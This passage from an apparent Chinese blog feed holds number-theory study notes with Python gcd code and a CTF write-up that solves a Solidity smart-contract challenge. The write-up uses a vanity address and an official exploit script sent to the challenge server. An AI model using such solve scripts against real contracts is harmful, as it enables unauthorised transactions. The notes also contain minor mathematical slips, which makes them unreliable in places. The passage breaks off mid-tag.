id="有限域伽罗瓦域">有限域（伽罗瓦域）</h3><p>如果域F只包含有限个元素，则称其为有限域。有限域中元素的个数称为有限域的阶。有限域的特征数必为某一素数p，因此它含的素域同构于Zp。若F是特征为p的有限域，则F中元素的个数为pⁿ,n为某一正整数。元素个数相同的有限域是同构的。因此，通常用GF(pⁿ)表示pⁿ元的有限域。GF(pⁿ)的乘法群是(pⁿ-1)阶的循环群。</p>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> Academic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>qsnCTF2024 Round1 Writeup</title>
      <link href="/posts/42fc2477/"/>
      <url>/posts/42fc2477/</url>
      
        <content type="html"><![CDATA[<h4 id="writeup点我"><ahref="https://www.blog.st4rr.top/writeups/qsnCTF2024Writeup.pdf">Writeup点我</a></h4><p>Additional Statement:</p><p>"小光的答案之书" in "Misc" was written by <strong>f4k3r</strong></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> qsnCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《初等数论》学习笔记</title>
      <link href="/posts/b974d0b6/"/>
      <url>/posts/b974d0b6/</url>
      
        <content type="html"><![CDATA[<blockquote><p>从今天开始，不间断地更新一些《初等数论》学习笔记，简单打一下密码学的基础<del>（为了密码学不爆零T0T）</del></p></blockquote><h2 id="第一章-整数的整除性">第一章 整数的整除性</h2><h3 id="gcdabgcdbr">gcd(a,b)=gcd(b,r)</h3><p>假设a和b都是整数，且a&gt;b</p><p><strong>a=bq+r</strong>, 0&lt;r&lt;b</p><p>其中q和r都是正整数，则a和b的最大公因数等于b和r的最大公因数，即</p><p><strong>gcd(a,b) = gcd(b,r)</strong></p><h3 id="欧几里得算法辗转相除法">欧几里得算法（辗转相除法）</h3><p>利用上述性质，我们可以用欧几里得算法来求两个较大数的最大公因数。用语言通俗地表达，就是先用较大数除以较小数，然后用上一个式子的除数除以上一个式子的余数，如此反复至余数为0，最后一个式子的除数即为最大公因数。</p><p>百度百科中的这张图较好地解释了其中原理：</p><p><img src="/images/《初等数论》学习笔记/辗转相除.webp" alt="辗转相除" style="zoom:50%;" /></p><p>下面是一个简单的python函数实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">while</span> a != <span class="number">0</span>:</span><br><span class="line">        a, b = b % a, a</span><br><span class="line">    <span class="keyword">return</span> b</span><br></pre></td></tr></table></figure><h3 id="扩展欧几里得算法">扩展欧几里得算法</h3><p>看书上都没有讲，但是也很重要，这里补充一下。</p><p>这个算法在用辗转相除法找到gcd(a,b)的前提下，还能找到x,y，使得ax+by=gcd(a,b)。（根据贝祖/裴蜀定理，x和y总是存在）</p><p>具体原理引用这篇文章来讲https://blog.csdn.net/qq_37701948/article/details/132716594</p><figure><img src="/images/《初等数论》学习笔记/image-20240224212552584.png"alt="image-20240224212552584" /><figcaption aria-hidden="true">image-20240224212552584</figcaption></figure><p>如此可以得到欧几里得算法中前后两步之间x和y的关系，已知最后一步时b=0，于是可以以此倒推出原来的x和y，下面是一个简单的python函数实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ext_euclid</span>(<span class="params">a, b</span>):     </span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:         </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a     </span><br><span class="line">    <span class="keyword">else</span>:         </span><br><span class="line">        x, y, q = ext_euclid(b, a % b) </span><br><span class="line">        <span class="comment"># q = gcd(a, b) = gcd(b, a%b)         </span></span><br><span class="line">        x, y = y, (x - (a // b) * y)         </span><br><span class="line">        <span class="keyword">return</span> x, y, q</span><br></pre></td></tr></table></figure><p>特别地，当a和b互素的时候，gcd(a,b)=1，因此要求的就是能使ax+by=1成立的x和y。这里的x其实就是a的模反元素（模逆元），在RSA解密中有着重要作用，以后的文章中再做详细的描述。</p><h3 id="abdm">ab=dm</h3><p>假设a和b都是正整数，a和b的最大公因数是d而a和b的最小公倍数是m，即(a,b)=d而{a,b}=m，则我们有</p><p>ab=dm</p><p>这可以用来更快捷地求出大数的最小公倍数：我们可以先试用欧几里得算法求出最大公因数，所以m=ab/d</p><h2 id="第二章-数的进位法">第二章 数的进位法</h2><h3 id="求补码">求补码</h3><p>对于二进制数(a1a2...an)2，当n≥3时，可用如下方法快速求补码</p><h4 id="当an1时">当an=1时</h4><p>除an不变，在a1,a2,...an-1中所有ai是0的都变成1，而所有ai是1的都变成0。由这种方法所得到的二进制数就是(a1a2...an)2的补码</p><h4 id="当an0时">当an=0时</h4><p>在(a1a2...an)2中从右往左看，则在出现1以前所有的0及其第一次出现的1都不变，而后各数遇0变成1，遇1则变成0.用这种方法所得到的二进制数就是(a1a2...an)2的补码。</p><h3id="利用补码来进行二进制数减法运算">利用补码来进行二进制数减法运算</h3><p>先求减数的补码，用被减数加上补码再减去减数</p><h2 id="第三章-一部分不定方程">第三章 一部分不定方程</h2><h3 id="一元不定方程">一元不定方程</h3><p>设n≥2，而n,a0,a1,...,an都是整数，求出关于整数系数的n次方程 <spanclass="math display">\[a_nx^n+a_{n-1}x^{n-1}+...+a_1x+a_0=0\]</span> 设x=α是其整数解，那么 <span class="math display">\[a_n\alpha^n+a_{n-1}\alpha^{n-1}+...+a_1\alpha+a_0=0\]</span></p><p><span class="math display">\[a_0=-\alpha(a_n\alpha^{n-1}+a_{n-1}\alpha^{n-2}+...+a_1)\]</span></p><p>所以只要能从a0中挑选出能使原式成立的因数，即为原式的整数解，否则无整数解</p><h3 id="二元一次不定方程">二元一次不定方程</h3><h4 id="定理">定理</h4><p>设二元一次不定方程ax+by=c（其中a,b,c都是正整数而gcd(a,b)=1，有一组整数解x=x0,y=y0，则其一切整数解可以表示成<span class="math display">\[\begin{cases} x=x_0-bt \\ y=y_0+at \end{cases}\]</span> 其中t=0,±1,±2,±3,...</p><h4 id="求axbyc的一切整数解">求ax+by=c的一切整数解</h4><p>假设gcd(a,b)=1，</p><p>先求ax+by=1的解，可利用第一章中所述之扩展欧几里得算法，得到解x=x0,y=y0.</p><p>所以ax+by=c(ax0+by0)，</p><p>所以x=cx0,y=cy0.</p><p>由上述定理得，x=cx0-bt，y=cy0+at，其中t=0,±1,±2,±3,...</p><p>如果放在实际应用问题中，要记得注意定义域。</p><h3 id="费马大定理">费马大定理</h3><p>当n是一个大于2的正整数时，则 <span class="math display">\[x^n+y^n=z^n\]</span> 这个不定方程没有正整数解。</p><h2 id="第四章-一次同余式及解法">第四章 一次同余式及解法</h2><h3 id="同余">同余</h3><p>如果a和b都是整数而m是一个固定的正整数，则当m|(a-b)（即m能够整除a-b）时，我们就说a,b对模m同余，记作<span class="math display">\[a\equiv b(mod\ m)\]</span></p><h3 id="一些结论">一些结论</h3><h4 id="section">1</h4><p>当a是整数而m是一个正整数时，则有 <span class="math display">\[a\equiv a(mod\ m)\]</span></p><h4 id="section-1">2</h4><p>如果a,b都是整数而m是一个正整数，则当 <span class="math display">\[a\equiv b(mod\ m)\]</span> 成立时，我们有 <span class="math display">\[b\equiv a(mod\ m)\]</span></p><h4 id="section-2">3</h4><p>如果a,b,c都是整数而m是一个正整数，则当 <span class="math display">\[a\equiv b(mod\ m)\]</span></p><p><span class="math display">\[b\equiv c(mod\ m)\]</span></p><p>都成立时，我们有 <span class="math display">\[a\equiv c(mod\ m)\]</span></p><h4 id="section-3">4</h4><p>如果a,b,c,d都是整数，而m是一个正整数，则当 <spanclass="math display">\[a\equiv b(mod\ m)\]</span></p><p><span class="math display">\[c\equiv d(mod\ m)\]</span></p><p>都成立时，我们有 <span class="math display">\[a+c\equiv b+d(mod\ m)\]</span></p><p><span class="math display">\[a-c\equiv b-d(mod\ m)\]</span></p><h4 id="section-4">5</h4><p>如果a,b,c都是整数，而m是一个正整数，则当 <spanclass="math display">\[a\equiv b(mod\ m)\]</span> 成立，我们有 <span class="math display">\[ac\equiv bc(mod\ m)\]</span></p><h4 id="section-5">6</h4><p>如果a,b,c,d都是整数，而m是一个正整数，则当 <spanclass="math display">\[a\equiv b(mod\ m)\]</span></p><p><span class="math display">\[c\equiv d(mod\ m)\]</span></p><p>都成立时，我们有 <span class="math display">\[ac\equiv bd(mod\ m)\]</span></p><h4 id="section-6">7</h4><p>如果a,b都是整数，而m和n都是正整数，则当 <span class="math display">\[a\equiv b(mod m)\]</span> 成立时，我们有 <span class="math display">\[a^n\equiv b^n(mod\ m)\]</span></p><h4 id="section-7">8</h4><p>如果a1,a2,...an,b1,b2,...bn都是整数，而m和n都是正整数，则当 <spanclass="math display">\[a_1\equiv b_1(mod\ m)\]</span></p><p><span class="math display">\[a_2\equiv b_2(mod\ m)\]</span></p><p>​ ...... <span class="math display">\[a_n\equiv b_n(mod\ m)\]</span></p><p>都成立时，我们有 <span class="math display">\[a_1+a_2+...+a_n\equiv b_1+b_2+...+b_n(mod\ m)\]</span></p><h4 id="section-8">9</h4><p>按照通常方法，把一个正整数a写成十进位数的形式，即 <spanclass="math display">\[a=a_n10^n+a_{n-1}10^{n-1}+...+a_0,0\leq a_i&lt;10\]</span> 当9能够整除an+an-1+...+a0时，则我们有9能够整除a</p><h3 id="弃九法">弃九法</h3><p><span class="math display">\[a=a_n10^n+a_{n-1}10^{n-1}+...+a_0\]</span></p><p><span class="math display">\[b=b_m10^m+b_{m-1}10^{m-1}+...+b_0\]</span></p><p><span class="math display">\[ab=P\]</span></p><p><span class="math display">\[P=c_l10^l+c_{l-1}10^{l-1}+...c_0\]</span></p><p>由上面的结论，我们可以得到 <span class="math display">\[a\equiv a_n+a_{n-1}+...+a_0(mod\ 9)\]</span></p><p><span class="math display">\[b\equiv b_n+b_{n-1}+...+b_0(mod\ 9)\]</span></p><p><span class="math display">\[P\equiv c_n+c_{n-1}+...+c_0(mod\ 9)\]</span></p><p>进而得到 <span class="math display">\[(a_n+a_{n-1}+...+a_0)(b_m+b_{m-1}+...+b_0)\equivc_l+c_{l-1}+...+c_0(mod\ 9)\]</span>如果an,an-1,...a0,bm,bm-1,...b0,cl,cl-1,...c0中有9出现，可以把9去掉</p><h3 id="一次同余式">一次同余式</h3><p>如果a,b都是整数，而m是一个正整数，当a mod m ≠0时，我们把 <spanclass="math display">\[ax+b\equiv 0(mod\ m)\]</span> 叫做模m的一次同余式</p><h3 id="一些结论-1">一些结论</h3><h4 id="section-9">1</h4><p>如果c能使ac+b mod m=0成立，则x mod m=c的一切整数x都能使其成立，也就是上式的一个解</p><h4 id="section-10">2</h4><p>当gcd(a.m)不能够整除b时，则一次同余式 <span class="math display">\[ax+b\equiv 0(mod\ m),a\ mod\ m\neq 0\]</span> 没有整数解</p><h4 id="section-11">3</h4><p>当gcd(a,m)=1时，则一次同余式 <span class="math display">\[ax+b\equiv 0(mod\ m),a\ mod\ m\neq 0\]</span> 有整数解</p><h4 id="section-12">4</h4><p>如果ad mod md =bd，则有a mod m=b</p><p><img src="/images/《初等数论》学习笔记/image-20240229000118869.png" alt="image-20240229000118869"  /></p><figure><img src="/images/《初等数论》学习笔记/image-20240229000135048.png"alt="image-20240229000135048" /><figcaption aria-hidden="true">image-20240229000135048</figcaption></figure><h3 id="孙子定理中国剩余定理">孙子定理（中国剩余定理）</h3><p>如果k≥2，而m1,m2,...mk是两个两两互素的k个正整数，也就是说，在这k个正整数中任意取出两个正整数来，则这两个正整数是互素的，令<span class="math display">\[M=m_1m_2...m_k=m_1M_1=m_2M_2=...=m_kM_k\]</span> 则同时满足同余式组 <span class="math display">\[x\equiv b_1(mod\ m_1),x\equiv b_2(mod\ m_2),...,x\equiv b_k(mod\ m_k)\]</span> 的正整数解是 <span class="math display">\[x\equiv b_1M&#39;_1M_1+b_2M&#39;_2M_2+...+b_kM&#39;_kM_k(mod\ M)\]</span> 这里M'i是满足同余式 <span class="math display">\[M&#39;_iM_i\equiv 1(mod\ m_i)\]</span> 的正整数解，i=1,2,...,k</p><p>其实百度百科上说的也不错：</p><figure><img src="/images/《初等数论》学习笔记/image-20240229002625329.png"alt="image-20240229002625329" /><figcaption aria-hidden="true">image-20240229002625329</figcaption></figure><p>根据不同的情况，中国剩余定理可以有不同的使用，但基本情况就是如上，对照着搓一下代码应该不难。</p><h2 id="第五章-剩余系欧拉定理费马定理及其应用">第五章剩余系，欧拉定理，费马定理及其应用</h2><h3 id="完全剩余系">完全剩余系</h3><figure><img src="/images/《初等数论》学习笔记/image-20240302002055889.png"alt="image-20240302002055889" /><figcaption aria-hidden="true">image-20240302002055889</figcaption></figure><h3 id="一些结论-2">一些结论</h3><h4 id="section-13">1</h4><p>设m是一个大于1的整数，b是一个整数且满足条件(b,m)=1.如果a1,a2,...am是模m的一个完全剩余系，则ba1,ba2,...,bam也是模m的一个完全剩余系</p><h4 id="section-14">2</h4><p>设m是一个大于1的整数，而b,c是两个任意的整数但满足条件(b,m)=1，如果a1,a2,...,am是模m的一个完全剩余系，则ba1+c,ba2+c,...,bam+c也是模m的一个完全剩余系</p><h4 id="section-15">3</h4><p>如果m是一个大于1的整数而a,b是任意的两个整数，使得 <spanclass="math display">\[a\equiv b(mod\ m)\]</span> 成立，则有gcd(a,m)=gcd(b,m)</p><h3 id="欧拉函数φm">欧拉函数φ(m)</h3><p>我们用φ(m)来表示不大于m而和m互素的正整数的个数。我们把φ(m)叫做欧拉函数。其中φ(1)=1</p><h3 id="引理">引理</h3><p>设l是一个正整数，p是一个素数，则我们有 <span class="math display">\[\varphi(p^l)=p^{l-1}(p-1)\]</span></p><h3 id="简化剩余系">简化剩余系</h3><figure><img src="/images/《初等数论》学习笔记/image-20240302145523366.png"alt="image-20240302145523366" /><figcaption aria-hidden="true">image-20240302145523366</figcaption></figure><figure><img src="/images/《初等数论》学习笔记/image-20240302145531674.png"alt="image-20240302145531674" /><figcaption aria-hidden="true">image-20240302145531674</figcaption></figure><h3 id="一个结论">一个结论</h3><p>设m是一个大于1的整数，a是一个整数且满足条件gcd(a,m)=1.如果b1,b2,...bφ(m)是模m的一个简化剩余系，则<span class="math display">\[ab_1,ab_2,...,ab_{\varphi (m)}\]</span> 也是模m的一个简化剩余系</p><h3 id="欧拉定理">欧拉定理</h3><p>设m是一个大于1的整数，a是一个素数且满足条件gcd(a,m)=1，则我们有 <spanclass="math display">\[a^{\varphi(m)}\equiv 1(mod\ m)\]</span> 上式在RSA算法中有重要作用</p><h3 id="费马小定理">费马小定理</h3><p>对于欧拉定理有一种特殊情况，那就是当模m为素数是时，此时就可以得到费马小定理<span class="math display">\[a^{p-1}\equiv 1(mod\ p)\]</span> ## 第六章 小数、分数和实数</p><h3 id="一些结论-3">一些结论</h3><h4 id="section-16">1</h4><p>设0&lt;a&lt;b，且gcd(a,b)=1.如果a/b能表示成纯循环小数，则我们有gcd(b,10)=1</p><h4 id="section-17">2</h4><p>设0&lt;a&lt;b，且gcd(a,b)=1.令h是一个最小的正整数，能使 <spanclass="math display">\[10^h\equiv 1(mod\ b)\]</span> 成立，则a/b能表示成纯循环小数0.a1...ah</p><h4 id="section-18">3</h4><p>设b是一个正整数且gcd(10,b)=1，令h是一个最小的正整数，能使 <spanclass="math display">\[10^h\equiv 1(mod\ b)\]</span> 成立，则有h|φ(b)</p><h4 id="section-19">4</h4><p>设a,b,b1都是正整数，a&lt;b，gcd(a,b)=1，b1&gt;1，gcd(b1,10)=1.b=2<sup>α5</sup>βb1，其中α,β都是非负整数但不同时为0.令h是一个最小的正整数且能使<span class="math display">\[10^h\equiv 1(mod\ b_1)\]</span> 则当α≥β时我们有 <span class="math display">\[\frac{a}{b}=0.a_t...a_a\dot a_\alpha...\dot a_{\alpha+h}\]</span> 而当α＜β时我们有 <span class="math display">\[\frac{a}{b}=0.a_1...a_\beta \dot a_{\beta+1}...\dot a_{\beta+h}\]</span></p><h2 id="第七章-连分数和数论分数">第七章 连分数和数论分数</h2><h3 id="连分数">连分数</h3><figure><img src="/images/《初等数论》学习笔记/image-20240302235054370.png"alt="image-20240302235054370" /><figcaption aria-hidden="true">image-20240302235054370</figcaption></figure><p>当1≤k≤n是一个整数时，我们把[a1,a2,...,ak]=pk/qk叫做(22)的第k个渐进分数。</p><h3 id="一些结论-4">一些结论</h3><h4 id="section-20">1</h4><p>设n≥3和连分数[a1,a2,...an]的渐进分数是p1/q1,p2/q2,...,pn/qn,则在这些剪辑分数之间，下面的关系式成立<span class="math display">\[p_1=a_1,q_1=1,p_2=a_1a_2+1,q_2=a_2\]</span> 而当3≤k≤n时，则有 <span class="math display">\[p_k=a_kp_{k-1}+p_{k-2},q_k=a_kq_{k-1}+q_{k-2}\]</span></p><h4 id="section-21">2</h4><p>如果连分数[a1,a2,...,an]的n个渐进分数是pk/qk（其中k=1,2,...,n），则当k≥2时我们有<span class="math display">\[p_kq_{k-1}-p_{k-1}q_k=(-1)^k\]</span> 而当k≥3时我们有 <span class="math display">\[p_kq_{k-2}-p_{k-2}q_k=(-1)^{k-1}a_k\]</span></p><h4 id="section-22">3</h4><p>每一个有理数都能够表示成为有限连分数</p><h4 id="section-23">4</h4><p>设[a1,a2,...,an...]是一个无限连分数，pk/qk(k=1,2,...)是它的第k个渐进分数，则当k≥2时我们有<span class="math display">\[\frac{p_{2(k-1)}}{q_{2(k-1)}}&gt;\frac{p_{2k}}{q_{2k}},\frac{p_{2k-1}}{q_{2k-1}}&gt;\frac{p_{2k-3}}{q_{2k-3}},\frac{p_{2k}}{q_{2k}}&gt;\frac{p_{2k-1}}{q_{2k-1}}\]</span></p><p>当k→∞时，pk/qk有一极限，则我们有 <span class="math display">\[\frac{p_1}{q_1}&lt;\frac{p_3}{q_3}&lt;\frac{p_5}{q_5}&lt;...&lt;[a_1,a_2,...,a_n...]&lt;...&lt;\frac{p_6}{q_6}&lt;\frac{p_4}{q_4}&lt;\frac{p_2}{q_2}\]</span></p><h3 id="取整函数">取整函数</h3><p>设x是任何一个实数，我们用[x]来表示不大于x的最大整数，我们用{x}表示x-[x]</p><p>有如下性质：</p><ol type="1"><li><p>x=[x]+{x},x-1&lt;[x]≤x</p></li><li><p>当n是一个整数时，我们有[n+x]=n+[x]</p></li><li><p>当0≤x&lt;1时，有[x]=0</p></li></ol><h3 id="循环连分数">循环连分数</h3><figure><img src="/images/《初等数论》学习笔记/image-20240303145246724.png"alt="image-20240303145246724" /><figcaption aria-hidden="true">image-20240303145246724</figcaption></figure><h3 id="xx的一些性质">[x],{x}的一些性质</h3><h4 id="section-24">1</h4><p><span class="math display">\[[x]+[y]\leq [x+y],\{x\}+\{y\}\geq \{x+y\}\]</span></p><p><span class="math display">\[[-x]=\begin{cases} -[x]+1, 当x不是整数时 \\ -[x], 当x是整数时\end{cases}\]</span></p><h4 id="section-25">2</h4><p>设n是任一个正整数而α是一个实数时，则有 <span class="math display">\[[\alpha]+[\alpha+\frac{1}{n}]+...+[\alpha+\frac{n-1}{n}]=[n\alpha]\]</span> 成立</p><h4 id="section-26">3</h4><p>设a,b是两个整数，b&gt;0，则有 <span class="math display">\[a=b[\frac{a}{b}]+b\{\frac{a}{b}\},0\leq b\{\frac{a}{b}\}\leq b-1\]</span></p><h4 id="section-27">4</h4><p>我们有 <span class="math display">\[[2x]+[2y]\geq [x]+[y]+[x+y]\]</span></p><h3 id="一些数论函数">一些数论函数</h3><p>除了前面提到过的欧拉函数和取整函数以外，我们还有一些数论函数</p><h4 id="除数函数">除数函数</h4><p>如果n是一个正整数，我们用d(n)来表示n的因数的个数。我们把d(n)叫做除数函数。</p><h5 id="section-28">1</h5><p>设n=p1<sup>α1...pm</sup>αm，其中p1,...pm都是不同的素数，而α1,...,αm都是正整数，则我们有<span class="math display">\[d(n)=(\alpha_1+1)...(\alpha_m+1)\]</span></p><h5 id="section-29">2</h5><p>设a,b是两个正整数而gcd(a,b)=1，则我们有 <span class="math display">\[d(ab)=d(a)d(b)\]</span></p><h4 id="因数和">因数和</h4><p>如果n是一个正整数，则我们把n的所有因数相加以后所得到的和叫做n的因数和，记作σ(n)</p><h5 id="section-30">1</h5><p>设m,n是两个正整数且gcd(m,n)=1，则我们有 <span class="math display">\[\sigma (mn)=\sigma(m)\cdot\sigma(n)\]</span></p><h4 id="真因数">真因数</h4><p>如果n是一个正整数，则我们把除去n本身以外的n的因数都叫作n的真因数</p><h4 id="完全数">完全数</h4><p>如果n是一个正整数，当我们把n的所有真因数相加以后，所得到的和恰好等于n时，则我们把n叫作完全数。或者说当σ(n)=2n成立时，则我们把n叫作完全数。</p><h5 id="section-31">1</h5><p>如果n是一个≥2的整数而2^n-1是一个素数，则 <spanclass="math display">\[2^{n-1}(2^n-1)\]</span> 是一个完全数</p><h4 id="σ和d的联系">σ和d的联系</h4><p>如果n是一个正整数而λ是一个非负整数，则令 <spanclass="math display">\[\sigma_\lambda(n)=\sum_{d|n}d^\lambda\]</span> 设m是一个整数，令m^0=1，我们有 <span class="math display">\[\sigma_0(n)=d(n)\]</span> 另外 <span class="math display">\[\sigma_1(n)=\sigma(n)\]</span></p><h4 id="莫比乌斯函数">莫比乌斯函数</h4><p><span class="math display">\[\mu(n)=\begin{cases} 1,当n=1时 \\ (-1)^r,当n是r个不同的素数的乘积时 \\0,当n能被一个素数的平方除尽时\end{cases}\]</span></p><h5 id="section-32">1</h5><p>如果m,n是两个正整数而gcd(m,n)=1，则我们有 <spanclass="math display">\[\mu(mn)=\mu(m)\cdot\mu(n)\]</span></p><h5 id="section-33">2</h5><p>我们有 <span class="math display">\[\sum_{d|n}\mu(d)=\begin{cases} 1,当n=1时 \\ 0,当n&gt;1时\end{cases}\]</span></p><h5 id="section-34">3</h5><p>设n=p1<sup>α1...pm</sup>αm，其中p1,...pm是m个不同的素数，而α1,...,αm都是正整数，则我们有<span class="math display">\[\sum_{d|n}|\mu(d)|=2^m\]</span></p><h2 id="第八章-关于复数和三角和的概念">第八章关于复数和三角和的概念</h2><h3 id="三角函数泰勒公式">三角函数泰勒公式</h3><p>这里贴一下三角函数泰勒公式<imgsrc="/images/《初等数论》学习笔记/image-20240303175243666.png"alt="image-20240303175243666" /></p><figure><img src="/images/《初等数论》学习笔记/image-20240303175252488.png"alt="image-20240303175252488" /><figcaption aria-hidden="true">image-20240303175252488</figcaption></figure><h3 id="欧拉公式">欧拉公式</h3><p><span class="math display">\[e^{i\theta}=cos\theta+isin\theta\]</span></p><p>并且由此可以推知， <span class="math display">\[|e^{i\theta}|=\sqrt{cos^2\theta+sin^2\theta}=1\]</span></p><h3 id="负数的指数式">负数的指数式</h3><p>根据上面的欧拉公式，复数z=r(cosθ+isinθ)可以表示为简单形式 <spanclass="math display">\[z=re^{i\theta}\]</span></p><h3 id="一些结论-5">一些结论</h3><h4 id="section-35">1</h4><p>设θ1和θ2是两个实数，则我们有 <span class="math display">\[e^{i(\theta_1+\theta_2)}=e^{i\theta_1}\cdot e^{i\theta_2}\]</span></p><h4 id="section-36">2</h4><p>设n是一个正整数而z=a+bi是一个复数，则当z≠1时我们有 <spanclass="math display">\[\sum_{m=0}^n{z^m}=\frac{1-z^{n+1}}{1-z}\]</span></p><h4 id="section-37">3</h4><p>我们有 <span class="math display">\[\sum_{m=0}^{n-1}{e^{i(\theta+\frac{n-1}{2}\varphi)}}\cdot\frac{sin\frac{n\varphi}{2}}{sin\frac{\varphi}{2}}\]</span> 其中n是一个正整数，φ≠2lπ，其中l是任一个整数，即{φ/2x}≠0</p><h2 id="也许暂时的结尾">（也许暂时的）结尾</h2><p>以上是本人读了前两册《初等数论》后记录的笔记。第二册的三角和部分及最后一册暂且先不读了，以后有需要再读了做补充。</p>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> Academic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记第一次上链</title>
      <link href="/posts/d93c1104/"/>
      <url>/posts/d93c1104/</url>
      
        <content type="html"><![CDATA[<blockquote><p>题目来源于SICTF2024 #Round 3 Blockchain方向的CheckinNewYear</p><p>当时这题没做出来，现在根据official writeup进行了一次复盘（</p></blockquote><h2 id="题目">题目</h2><p><img src="/images/记第一次上链/屏幕截图 2024-02-22 235215.png" alt="屏幕截图 2024-02-22 235215" style="zoom:50%;" /></p><p>如何注册使用metamask这里不再赘述，remixIDE网站：https://remix.ethereum.org/</p><p>先生成一个deployer account:</p><figure><img src="/images/记第一次上链/image-20240223012955732.png"alt="image-20240223012955732" /><figcaption aria-hidden="true">image-20240223012955732</figcaption></figure><p>按照要求给这个账户去水龙头接点水，不然就会无法支付2中部署合约时产生的费用</p><figure><img src="/images/记第一次上链/image-20240223013024832.png"alt="image-20240223013024832" /><figcaption aria-hidden="true">image-20240223013024832</figcaption></figure><p>部署一下题目的智能合约，得到合约地址和token</p><figure><img src="/images/记第一次上链/image-20240223013113909.png"alt="image-20240223013113909" /><figcaption aria-hidden="true">image-20240223013113909</figcaption></figure><p>用4查看一下合约的源代码</p><p><img src="/images/记第一次上链/屏幕截图 2024-02-23 004703.png" alt="屏幕截图 2024-02-23 004703" style="zoom:50%;" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: shu shao de xiao mi di</span><br><span class="line">pragma solidity ^0.8.9;</span><br><span class="line">contract HappyNewYear&#123;</span><br><span class="line">    string private NewYear;</span><br><span class="line">    constructor(string memory _newyear )  &#123;</span><br><span class="line">        NewYear = _newyear;</span><br><span class="line">    &#125;</span><br><span class="line">    function happyNewYear(string memory _newYear) public payable &#123;</span><br><span class="line">        require(uint160(msg.sender) |</span><br><span class="line">        2**16 * 3**3 * 5 * 7 * 13 * 17 * 19 * 37 * 73 * 97 * 109 * 241 * 257 * 433 * 577 * 673 * 38737 * 487824887233 ==</span><br><span class="line">        2**2 * 17 * 67 * 733 * 316139 * 18992431891 * 72887484710091183279372959</span><br><span class="line">        ,&quot;Not this Year&quot;);</span><br><span class="line">        NewYear = _newYear;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">       function isSolved() public view returns (bool)&#123;</span><br><span class="line">        require(keccak256(abi.encodePacked(NewYear)) == keccak256(abi.encodePacked(&quot;Happy&quot;)),&quot;not HappyNewYear&quot;);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>阅读一下代码逻辑，发现其中对用户的地址有限制。这里用两串较长的式子进行了简单的混淆，经过计算不难发现，这里的限制是要求用户地址的最后四位是2024。</p><p>在这里，officialwriteup中给出了一个可以专门用来生成指定形式地址的网站：https://vanity-eth.tk/</p><blockquote><p>比赛期间做的时候就是卡在这里了，学长发了我exp.sol我都不会用。。。没想到其实有这么方便的网站~（T0T)</p></blockquote><figure><img src="/images/记第一次上链/image-20240223183457544.png"alt="image-20240223183457544" /><figcaption aria-hidden="true">image-20240223183457544</figcaption></figure><p>接下来只要给isSolved函数的NewYear值传一个"Happy"字符串就可以了</p><h2 id="python编写exp">python编写exp</h2><p>官方给出的exp.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cheb3 <span class="keyword">import</span> Connection</span><br><span class="line"><span class="keyword">from</span> cheb3.utils <span class="keyword">import</span> compile_file</span><br><span class="line">entrant_abi, entrant_bytecode = compile_file(<span class="string">&quot;Example.sol&quot;</span>, <span class="string">&quot;HappyNewYear&quot;</span>,</span><br><span class="line"><span class="string">&quot;0.8.9&quot;</span>)[<span class="string">&#x27;HappyNewYear&#x27;</span>]  <span class="comment">#确保Example.sol跟这个py文件在同一路径下</span></span><br><span class="line">conn = Connection(<span class="string">&#x27;http://124.221.86.119:40002&#x27;</span>)</span><br><span class="line">existing_account =conn.account(<span class="string">&quot;...&quot;</span>)  <span class="comment">#这里是填写上面生成的账号的Private Key</span></span><br><span class="line">target_address = <span class="string">&quot;0x3C58Ec40D7E79BEf9c7987b7c5414b0B13CcEDEe&quot;</span>  <span class="comment">#合约地址</span></span><br><span class="line">entrant_contract = conn.contract(</span><br><span class="line">existing_account,</span><br><span class="line">address=target_address,</span><br><span class="line">abi=entrant_abi</span><br><span class="line">)</span><br><span class="line">entrant_contract.functions.happyNewYear(<span class="string">&quot;Happy&quot;</span>).send_transaction()</span><br></pre></td></tr></table></figure><p>成功运行以后只要去nc的3中查看即可</p><figure><img 